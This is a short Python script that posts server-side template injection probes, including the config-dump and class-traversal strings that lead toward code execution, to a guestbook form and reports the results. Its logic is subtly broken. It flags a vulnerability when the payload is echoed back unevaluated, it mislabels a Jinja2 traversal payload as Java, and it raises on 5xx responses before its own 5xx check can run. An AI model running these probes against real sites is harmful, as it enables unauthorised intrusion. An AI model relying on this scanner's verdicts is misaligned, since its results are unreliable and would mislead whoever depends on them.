import requests

def check_ssti_vulnerability(url):
    try:
        payloads = [
            '{{ 7*7 }}',  # Basic SSTI payload
            '{{ config }}',  # Payload to display configuration file
            '{{ [].class.base.subclasses() }}'  # Payload to display Java object model
            # Additional payloads can be added...
        ]
        
        for payload in payloads:
            response = requests.post(url, data={'name': payload}, timeout=5)
            response.raise_for_status()
            
            if payload in response.text:
                print("Potential SSTI vulnerability found with payload:", payload)
                print("Response content:", response.text)
            else:
                print("No SSTI vulnerability found with payload:", payload)
            
            if response.status_code >= 500:
                print("Server returned a 5xx status code which might indicate SSTI vulnerability:", response.status_code)
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

# URL for SSTI check
url = 'https://example.com/guestbook'
check_ssti_vulnerability(url)
